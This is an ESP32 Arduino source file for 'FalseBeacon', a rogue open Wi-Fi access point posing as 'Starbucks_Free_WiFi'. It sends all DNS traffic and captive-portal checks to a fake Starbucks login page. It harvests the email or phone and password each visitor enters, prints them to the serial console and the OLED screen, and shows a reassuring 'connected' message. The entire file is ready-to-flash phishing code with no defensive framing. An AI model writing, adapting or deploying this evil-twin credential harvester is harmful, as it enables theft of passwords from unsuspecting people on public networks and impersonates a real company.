#include <WiFi.h>
#include <WebServer.h>
#include <Wire.h>
#include <Adafruit_SSD1306.h>
#include <DNSServer.h> // Import DNS Server library

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Wi-Fi credentials
const char *ssid = "Starbucks_Free_WiFi";
const char *password = "";

WebServer server(80); // HTTP server on port 80
DNSServer dnsServer;  // DNS server for redirection

String lastCapturedUsername = "";
String lastCapturedPassword = "";

// Function declarations
void handleRoot();
void handleCapture();
void dnsQueryCallback(const char *domain, IPAddress &ip);

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Initialize OLED display
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 allocation failed"));
  } else {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0,0);
    display.println("Starting Wi-Fi...");
    display.display();
  }

  // Setup Wi-Fi AP
  WiFi.mode(WIFI_AP);
  bool result = WiFi.softAP(ssid, password);

  if(result) {
    Serial.println("Wi-Fi AP started!");
    Serial.println("SSID: " + String(ssid));
    Serial.println("IP address: " + WiFi.softAPIP().toString());

    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0,0);
    display.println("Project: FalseBeacon");
    display.println(ssid);
    display.println(WiFi.softAPIP());
    display.display();
  } else {
    Serial.println("Wi-Fi AP Failed!");
  }

  // Start DNS server to handle redirection
  dnsServer.start(53, "*", WiFi.softAPIP()); // Redirect all DNS queries to the ESP32's IP address

  // HTTP Server handling
  server.on("/", handleRoot);
  server.on("/generate_204", handleRoot);
  server.on("/connecttest.txt", handleRoot);
  server.on("/hotspot-detect.html", handleRoot);
  server.on("/ncsi.txt", handleRoot);
  server.on("/capture", HTTP_POST, handleCapture);  // <-- Handle form POST
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  dnsServer.processNextRequest();  // DNS redirection
  server.handleClient();           // Handle HTTP requests
}

// Fake Coffee Shop Login Page
void handleRoot() {
  String page = "<!DOCTYPE html><html lang='en'>";
  page += "<head>";
  page += "<meta charset='UTF-8'>";
  page += "<meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  page += "<title>☕ Starbucks Wi-Fi</title>";
  page += "<style>";
  page += "body { font-family: 'Arial', sans-serif; text-align: center; background-color: #f4f4f4; margin: 0; padding: 0;}";
  page += "h1 { color: #2c3e50; font-size: 40px; margin-top: 50px;}";
  page += "p { color: #7f8c8d; font-size: 18px; margin: 10px 0;}";
  page += "form { margin-top: 30px; padding: 20px; background-color: #fff; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); display: inline-block;}";
  page += "input[type='text'], input[type='password'] { padding: 10px; width: 250px; margin: 10px 0; border: 2px solid #bdc3c7; border-radius: 5px; font-size: 16px;}";
  page += "input[type='submit'] { background-color: #2ecc71; color: white; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px;}";
  page += "input[type='submit']:hover { background-color: #27ae60;}";
  page += ".footer { font-size: 12px; color: #95a5a6; margin-top: 20px;}";
  page += "</style>";
  page += "</head>";
  page += "<body>";

  page += "<h1>☕ Welcome to Starbucks Wi-Fi</h1>";
  page += "<p>Login to enjoy your free coffee and Wi-Fi!</p>";

  page += "<form action='/capture' method='POST'>";
  page += "<input type='text' name='username' placeholder='Email or Phone' required><br>";
  page += "<input type='password' name='password' placeholder='Password' required><br>";
  page += "<input type='submit' value='Login'>";
  page += "</form>";

  page += "<div class='footer'>";
  page += "<p>Powered by ☕ Starbucks</p>";
  page += "<p>Free Wi-Fi. Free Coffee. Just Enjoy!</p>";
  page += "</div>";

  page += "</body>";
  page += "</html>";

  server.send(200, "text/html", page);
}

// Capture credentials
void handleCapture() {
  if (server.hasArg("username") && server.hasArg("password")) {
    lastCapturedUsername = server.arg("username");
    lastCapturedPassword = server.arg("password");

    Serial.println("===== New Login Captured =====");
    Serial.println("Username: " + lastCapturedUsername);
    Serial.println("Password: " + lastCapturedPassword);
    Serial.println("===============================");

    // Update OLED screen
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0,0);
        display.println("Project: FalseBeacon");
    display.println("Captured Login:");
    display.println("User: " + lastCapturedUsername);
    display.println("Pass: " + lastCapturedPassword);
    display.display();
  }
  // Send success page
  server.send(200, "text/html", "<html><body style='text-align:center; font-family:Arial; background-color:#ecf0f1;'>"
  "<h2 style='color:#27ae60;'>You're connected! 🎉</h2>"
  "<p style='font-size:18px;'>Enjoy your free Wi-Fi and coffee. ☕</p>"
  "<p style='font-size:14px;'>This is your new digital space to relax and browse!</p>"
  "<br><br><a href='http://www.starbucks.com' style='color:#3498db;'>Go to Starbucks</a></body></html>");
}

// DNS Query Callback (handle all DNS queries to redirect to the login page)
void dnsQueryCallback(const char *domain, IPAddress &ip) {
  // Redirect all DNS requests to the AP's IP address
  ip = WiFi.softAPIP();
}
